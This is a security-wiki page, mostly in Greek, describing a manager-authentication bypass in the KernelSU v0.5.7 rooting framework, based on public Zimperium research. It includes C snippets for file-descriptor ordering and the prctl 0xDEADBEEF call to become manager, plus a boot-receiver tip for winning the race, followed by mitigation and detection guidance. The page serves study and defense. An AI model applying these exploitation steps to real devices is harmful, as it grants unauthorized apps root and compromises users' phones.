# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks όπως τα KernelSU, APatch, SKRoot και Magisk συχνά τροποποιούν τον Linux/Android kernel και εκθέτουν privileged λειτουργικότητα σε ένα unprivileged userspace "manager" app μέσω ενός hooked syscall. Αν το βήμα manager-authentication έχει flaws, οποιοδήποτε local app μπορεί να φτάσει σε αυτό το channel και να κάνει privilege escalation σε ήδη-rooted συσκευές.

Αυτή η σελίδα συνοψίζει τις τεχνικές και τις παγίδες που αποκαλύφθηκαν σε public research (κυρίως την ανάλυση της Zimperium για το KernelSU v0.5.7), ώστε τόσο οι red όσο και οι blue teams να κατανοήσουν τα attack surfaces, τα exploitation primitives και τα robust mitigations.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch hooks ένα syscall (συνήθως το prctl) για να λαμβάνει "commands" από το userspace.
- Το protocol συνήθως είναι: magic_value, command_id, arg_ptr/len ...
- Ένα userspace manager app κάνει πρώτα authentication (π.χ. CMD_BECOME_MANAGER). Μόλις ο kernel χαρακτηρίσει τον caller ως trusted manager, γίνονται αποδεκτά privileged commands:
- Grant root στον caller (π.χ. CMD_GRANT_ROOT)
- Διαχείριση allowlists/deny-lists για su
- Ρύθμιση SELinux policy (π.χ. CMD_SET_SEPOLICY)
- Query version/configuration
- Επειδή οποιοδήποτε app μπορεί να κάνει invoke syscalls, η ορθότητα του manager authentication είναι κρίσιμη.

Example (KernelSU design):
- Hooked syscall: prctl
- Magic value για redirect στο KernelSU handler: 0xDEADBEEF
- Τα commands περιλαμβάνουν: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, κ.λπ.

---
## KernelSU v0.5.7 authentication flow (as implemented)

Όταν το userspace καλεί prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), το KernelSU επαληθεύει:

1) Path prefix check
- Το path πρέπει να ξεκινά με το αναμενόμενο prefix για το caller UID, π.χ. /data/data/<pkg> ή /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Το path πρέπει να ανήκει στο caller UID.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check μέσω FD table scan
- Γίνεται iterate στα open file descriptors (FDs) του calling process.
- Επιλέγεται το πρώτο file του οποίου το path ταιριάζει με /data/app/*/base.apk.
- Γίνεται parse της APK v2 signature και verify έναντι του official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

Αν όλοι οι έλεγχοι περάσουν, ο kernel αποθηκεύει προσωρινά το UID του manager και αποδέχεται privileged commands από αυτό το UID μέχρι να γίνει reset.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

Αν το signature check συνδέεται με το "first matching /data/app/*/base.apk" που εντοπίζεται στο process FD table, τότε στην πραγματικότητα δεν επαληθεύει το package του caller. Ένας attacker μπορεί να τοποθετήσει εκ των προτέρων ένα legitimately signed APK (του πραγματικού manager), ώστε να εμφανίζεται νωρίτερα στη FD list από το δικό του base.apk.

Αυτό το trust-by-indirection επιτρέπει σε ένα unprivileged app να impersonate τον manager χωρίς να κατέχει το signing key του manager.<sup>[[1]](#references)</sup>

Key properties exploited:<sup>[[1]](#references)</sup>
- Το FD scan δεν συνδέεται με την package identity του caller· κάνει μόνο pattern-match σε path strings.
- Το open() επιστρέφει το χαμηλότερο διαθέσιμο FD. Κλείνοντας πρώτα τα FDs με χαμηλότερο αριθμό, ένας attacker μπορεί να ελέγξει το ordering.
- Το filter ελέγχει μόνο ότι το path ταιριάζει με /data/app/*/base.apk – όχι ότι αντιστοιχεί στο installed package του caller.

---
## Attack preconditions

- Η συσκευή είναι ήδη rooted με vulnerable rooting framework (π.χ. KernelSU v0.5.7).
- Ο attacker μπορεί να εκτελέσει arbitrary unprivileged code τοπικά (Android app process).
- Ο πραγματικός manager δεν έχει ακόμη κάνει authentication (π.χ. αμέσως μετά από reboot). Ορισμένα frameworks κάνουν cache το manager UID μετά την επιτυχία· πρέπει να κερδίσετε το race.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:<sup>[[1]](#references)[[9]](#references)</sup>
1) Δημιουργήστε ένα valid path προς το δικό σας app data directory, ώστε να ικανοποιούνται οι prefix και ownership checks.
2) Βεβαιωθείτε ότι ένα genuine KernelSU Manager base.apk είναι ανοιχτό σε FD με μικρότερο αριθμό από το δικό σας base.apk.
3) Κάντε invoke το prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) για να περάσετε τους checks.
4) Εκδώστε privileged commands όπως CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY για να διατηρήσετε το elevation.

Practical notes on step 2 (FD ordering):<sup>[[1]](#references)</sup>
- Εντοπίστε το FD του process σας για το δικό σας /data/app/*/base.apk, διατρέχοντας τα symlinks του /proc/self/fd.
- Κλείστε ένα low FD (π.χ. stdin, fd 0) και ανοίξτε πρώτα το legitimate manager APK, ώστε να καταλάβει το fd 0 (ή οποιοδήποτε index είναι μικρότερο από το FD του δικού σας base.apk).
- Κάντε bundle το legitimate manager APK με το app σας, ώστε το path του να ικανοποιεί το naive filter του kernel. Για παράδειγμα, τοποθετήστε το σε ένα subpath που ταιριάζει με /data/app/*/base.apk.

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Εξανάγκασε ένα FD με χαμηλότερο αριθμό να δείχνει στο legitimate manager APK:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Αυθεντικοποίηση του Manager μέσω prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Μετά την επιτυχία, privileged commands (παραδείγματα):
- CMD_GRANT_ROOT: προώθηση της τρέχουσας διεργασίας σε root
- CMD_ALLOW_SU: προσθήκη του package/UID σας στο allowlist για persistent su
- CMD_SET_SEPOLICY: προσαρμογή της SELinux policy όπως υποστηρίζεται από το framework

Συμβουλή για race/persistence:
- Καταχωρίστε έναν BOOT_COMPLETED receiver στο AndroidManifest (RECEIVE_BOOT_COMPLETED), ώστε να ξεκινά νωρίς μετά το reboot και να επιχειρεί authentication πριν από τον πραγματικό manager.<sup>[[1]](#references)</sup>

---
## Οδηγίες detection και mitigation

Για developers framework:
- Συνδέστε το authentication με το package/UID του caller και όχι με αυθαίρετα FDs:
- Επιλύστε το package του caller από το UID του και επαληθεύστε το σε σχέση με το signature του εγκατεστημένου package (μέσω PackageManager), αντί να κάνετε scanning των FDs.
- Αν είναι kernel-only, χρησιμοποιήστε stable caller identity (task creds) και επικυρώστε την από stable source of truth που διαχειρίζεται από init/userspace helper, όχι από process FDs.
- Αποφύγετε τους ελέγχους path-prefix ως identity· ικανοποιούνται trivially από τον caller.
- Χρησιμοποιήστε nonce-based challenge–response μέσω του channel και εκκαθαρίστε οποιοδήποτε cached manager identity κατά το boot ή σε βασικά events.
- Εξετάστε authenticated IPC βασισμένο σε binder, αντί για υπερφόρτωση generic syscalls, όπου αυτό είναι εφικτό.

Για defenders/blue team:
- Εντοπίζετε την παρουσία rooting frameworks και manager processes· παρακολουθείτε prctl calls με ύποπτες magic constants (π.χ. 0xDEADBEEF), εφόσον διαθέτετε kernel telemetry.
- Σε managed fleets, αποκλείστε ή δημιουργήστε alert για boot receivers από untrusted packages που επιχειρούν γρήγορα privileged manager commands μετά το boot.
- Βεβαιωθείτε ότι οι συσκευές είναι ενημερωμένες σε patched framework versions· ακυρώστε τα cached manager IDs κατά το update.

Περιορισμοί του attack:
- Επηρεάζει μόνο συσκευές που είναι ήδη rooted με vulnerable framework.
- Συνήθως απαιτεί reboot/race window πριν από το authentication του legitimate manager (ορισμένα frameworks αποθηκεύουν προσωρινά το manager UID μέχρι το reset).

---
## Σχετικές σημειώσεις μεταξύ frameworks

- Το password-based auth (π.χ. ιστορικά APatch/SKRoot builds) μπορεί να είναι αδύναμο αν τα passwords μπορούν να προβλεφθούν ή να υποβληθούν σε bruteforce ή αν οι validations περιέχουν bugs.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Το package/signature-based auth (π.χ. KernelSU) είναι ισχυρότερο κατ’ αρχήν, αλλά πρέπει να συνδέεται με τον πραγματικό caller και όχι με έμμεσα artefacts, όπως FD scans.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: Το CVE-2024-48336 (MagiskEoP) έδειξε ότι ακόμη και ώριμα ecosystems μπορεί να είναι ευάλωτα σε identity spoofing, το οποίο οδηγεί σε code execution με root μέσα στο manager context.<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – Το Rooting όλων των κακών: Security Holes που θα μπορούσαν να θέσουν σε κίνδυνο τη mobile συσκευή σας](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – Έλεγχοι path στο core_hook.c (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – FD iteration/signature check στο manager.c (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – APK v2 verification στο apk_sign.c (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
